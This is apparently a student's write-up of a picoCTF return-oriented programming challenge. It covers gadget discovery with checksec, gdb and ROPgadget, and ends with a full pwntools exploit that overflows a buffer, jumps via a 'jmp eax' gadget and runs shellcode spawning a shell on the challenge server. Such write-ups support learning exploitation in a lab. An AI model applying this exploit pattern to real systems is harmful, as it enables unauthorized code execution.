## Write-Up

### Preparatory Phase
As per the name of the challenge I had to research how to conduct return-oriented programming (ROP). It a relatively intermediate-level skill which builds upon the the skills I've learnt in buffer overflow exploitaiton. The following step by step was as summary of [this](#https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing). The basic premise of this is to chain together so-called gadgets which enables us as the attacker to force the program to jump to un-intended areas of code. Gadgets are an instruction which typically ends with a `ret` for example: `pop rdi; ret.`

1. Find the offset to the return address via `gdb`
2. See where the buffer starts to be filled from i.e. `eax` in this case
3. 




### Attack Phase
Using `checksec vuln` I was able to ascertain important information such as the binary's architecture and protections. An interesting discovery was that the stack was exectuable. Therefore I suspected we could execute our own shell code

I now used `gdb` to find the offset which was determined to be 28 bytes. Therefore we need 28 bytes to reach the return pointer which for a 32-bit system is the `eip` register. 

We then need to obtain the ROP gadget for `jmp eax`. This was achieved via `ROPgadget --binary vuln | grep "jmp eax"`.

### Final Solution/Payload
``` py
from pwn import *

local = False
offset = 24
short_jump = b'\xeb\x08\x90\x90'
payload = b'A' * offset
payload += short_jump
payload += p32(0x0805333b)
payload += b'\x90'*100
payload += asm(shellcraft.i386.linux.sh())

if local:
    io = process('./vuln')
else:
    io = remote('saturn.picoctf.net', 60948)
io.sendline(payload)
io.interactive()
```

### Lessons Learnt
I had to first understand what return oriented programming was. By extension this required understanding what gadgets were. 

I had to peek at the solution to obtain the `short_jump`. We need this as " This is done in order to jump over the return address that we overwrote before. This is due to the fact that if we donâ€™t jump over this address, then the bytes from which it consists are going to be interpreted as code and are going to get executed, leading to unpredictable results."
